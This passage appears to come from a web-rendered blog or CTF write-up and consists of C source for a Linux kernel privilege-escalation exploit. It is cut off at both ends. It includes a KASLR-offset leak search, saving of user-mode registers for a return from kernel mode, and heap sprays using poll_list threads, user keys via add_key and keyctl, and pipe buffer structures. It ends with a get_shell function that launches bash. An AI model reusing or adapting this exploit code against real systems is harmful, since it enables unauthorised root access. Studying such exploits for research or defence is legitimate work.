class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/xattr.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sysinfo.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE 0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">randint</span><span class="params">(<span class="type">int</span> min, <span class="type">int</span> max)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> min + (rand() % (max - min));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">bool</span> fixed, <span class="type">bool</span> thread)</span> &#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(fixed ? <span class="number">0</span> : randint(<span class="number">1</span>, get_nprocs()), &amp;cpu_set);</span><br><span class="line">    <span class="keyword">if</span> (thread) &#123;</span><br><span class="line">        pthread_setaffinity_np(pthread_self(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">qword_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] %s:\n&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">is_kernel_text_addr</span><span class="params">(<span class="type">size_t</span> addr)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> addr &gt;= <span class="number">0xFFFFFFFF80000000</span> &amp;&amp; addr &lt;= <span class="number">0xFFFFFFFFFEFFFFFF</span>;</span><br><span class="line"><span class="comment">//    return addr &gt;= 0xFFFFFFFF80000000 &amp;&amp; addr &lt;= 0xFFFFFFFF9FFFFFFF;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">is_dir_mapping_addr</span><span class="params">(<span class="type">size_t</span> addr)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> addr &gt;= <span class="number">0xFFFF888000000000</span> &amp;&amp; addr &lt;= <span class="number">0xFFFFc87FFFFFFFFF</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INVALID_KERNEL_OFFSET 0x1145141919810</span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> kernel_addr_list[] = &#123;</span><br><span class="line">        <span class="number">0xffffffff813275c0</span>,</span><br><span class="line">        <span class="number">0xffffffff812d4320</span>,</span><br><span class="line">        <span class="number">0xffffffff812d4340</span>,</span><br><span class="line">        <span class="number">0xffffffff812d4330</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">kernel_offset_query</span><span class="params">(<span class="type">size_t</span> kernel_text_leak)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!is_kernel_text_addr(kernel_text_leak)) &#123;</span><br><span class="line">        <span class="keyword">return</span> INVALID_KERNEL_OFFSET;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(kernel_addr_list) / <span class="keyword">sizeof</span>(kernel_addr_list[<span class="number">0</span>]); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!((kernel_text_leak ^ kernel_addr_list[i]) &amp; <span class="number">0xFFF</span>)</span><br><span class="line">            &amp;&amp; (kernel_text_leak - kernel_addr_list[i]) % <span class="number">0x100000</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> kernel_text_leak - kernel_addr_list[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] unknown kernel addr: %#lx\n&quot;</span>, kernel_text_leak);</span><br><span class="line">    <span class="keyword">return</span> INVALID_KERNEL_OFFSET;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">search_kernel_offset</span><span class="params">(<span class="type">void</span> *buf, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> *search_buf = buf;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i++) &#123;</span><br><span class="line">        <span class="type">size_t</span> kernel_offset = kernel_offset_query(search_buf[i]);</span><br><span class="line">        <span class="keyword">if</span> (kernel_offset != INVALID_KERNEL_OFFSET) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel leak addr: %#lx\n&quot;</span>, search_buf[i]);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel offset: %#lx\n&quot;</span>, kernel_offset);</span><br><span class="line">            <span class="keyword">return</span> kernel_offset;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> INVALID_KERNEL_OFFSET;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_rflags, user_sp, user_ss;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> nfds, timer;</span><br><span class="line">&#125; poll_args;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">poll_list</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">poll_list</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">entries</span>[];</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">pthread_mutex_t</span> mutex = PTHREAD_MUTEX_INITIALIZER;</span><br><span class="line"><span class="type">size_t</span> poll_threads, poll_cnt;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">alloc_poll_list</span><span class="params">(<span class="type">void</span> *args)</span> &#123;</span><br><span class="line">    <span class="type">int</span> nfds = ((poll_args *) args)-&gt;nfds;</span><br><span class="line">    <span class="type">int</span> timer = ((poll_args *) args)-&gt;timer;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> *<span class="title">pfds</span> =</span> <span class="built_in">calloc</span>(nfds, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pollfd));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nfds; i++) &#123;</span><br><span class="line">        pfds[i].fd = open(<span class="string">&quot;/etc/passwd&quot;</span>, O_RDONLY);</span><br><span class="line">        pfds[i].events = POLLERR;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    bind_core(<span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    pthread_mutex_lock(&amp;mutex);</span><br><span class="line">    poll_threads++;</span><br><span class="line">    pthread_mutex_unlock(&amp;mutex);</span><br><span class="line">    poll(pfds, nfds, timer);</span><br><span class="line"></span><br><span class="line">    bind_core(<span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    pthread_mutex_lock(&amp;mutex);</span><br><span class="line">    poll_threads--;</span><br><span class="line">    pthread_mutex_unlock(&amp;mutex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N_STACK_PPS 30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POLL_NUM 0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="type">pthread_t</span> poll_tid[POLL_NUM];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">create_poll_thread</span><span class="params">(<span class="type">size_t</span> size, <span class="type">int</span> timer)</span> &#123;</span><br><span class="line">    poll_args *args = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="keyword">sizeof</span>(poll_args));</span><br><span class="line">    args-&gt;nfds = </span><br><span class="line">        (size - (size + PAGE_SIZE - <span class="number">1</span>) / PAGE_SIZE * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> poll_list)) / <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pollfd)</span><br><span class="line">        + N_STACK_PPS;</span><br><span class="line">    args-&gt;timer = timer;</span><br><span class="line">    pthread_create(&amp;poll_tid[poll_cnt++], <span class="number">0</span>, alloc_poll_list, args);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">wait_poll_start</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (poll_threads != poll_cnt);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">join_poll_threads</span><span class="params">(<span class="type">void</span> (*confuse)(<span class="type">void</span> *), <span class="type">void</span> *confuse_args)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; poll_threads; i++) &#123;</span><br><span class="line">        pthread_join(poll_tid[i], <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span> (confuse != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            confuse(confuse_args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    poll_cnt = poll_threads = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*func)(<span class="keyword">struct</span> callback_head *head);</span><br><span class="line">&#125; __attribute__((aligned(<span class="keyword">sizeof</span>(<span class="type">void</span> *))));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rcu_head callback_head</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __aligned(x)                    __attribute__((__aligned__(x)))</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> u64;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_key_payload</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span>        <span class="comment">/* RCU destructor */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> datalen;    <span class="comment">/* length of this data */</span></span><br><span class="line">    <span class="type">char</span> data[<span class="number">0</span>] __aligned(__alignof__(u64)); <span class="comment">/* actual data */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_NUM 199</span></span><br><span class="line"><span class="type">int</span> key_id[KEY_NUM];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">key_alloc</span><span class="params">(<span class="type">int</span> id, <span class="type">void</span> *payload, <span class="type">int</span> payload_len)</span> &#123;</span><br><span class="line">    <span class="type">char</span> description[<span class="number">0x10</span>] = &#123;&#125;;</span><br><span class="line">    <span class="built_in">sprintf</span>(description, <span class="string">&quot;%d&quot;</span>, id);</span><br><span class="line">    <span class="keyword">return</span> key_id[id] = </span><br><span class="line">        syscall(__NR_add_key, <span class="string">&quot;user&quot;</span>, description, payload, </span><br><span class="line">                payload_len - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> user_key_payload), KEY_SPEC_PROCESS_KEYRING);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">key_update</span><span class="params">(<span class="type">int</span> id, <span class="type">void</span> *payload, <span class="type">size_t</span> plen)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_UPDATE, key_id[id], payload, plen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">key_read</span><span class="params">(<span class="type">int</span> id, <span class="type">void</span> *bufer, <span class="type">size_t</span> buflen)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_READ, key_id[id], bufer, buflen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">key_revoke</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_REVOKE, key_id[id], <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">key_unlink</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_UNLINK, key_id[id], KEY_SPEC_PROCESS_KEYRING);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_file_private</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">tty</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_bufer</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> (*confirm)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_bufer *);</span><br><span class="line">    <span class="type">void</span> (*release)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_bufer *);</span><br><span class="line">    <span class="type">int</span> (*try_steal)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_bufer *);</span><br><span class="line">    <span class="type">int</span> (*get)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_bufer *);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">char</span> *args[] = &#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-i&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    execve(args[<span class="number">0</span>], args, <span 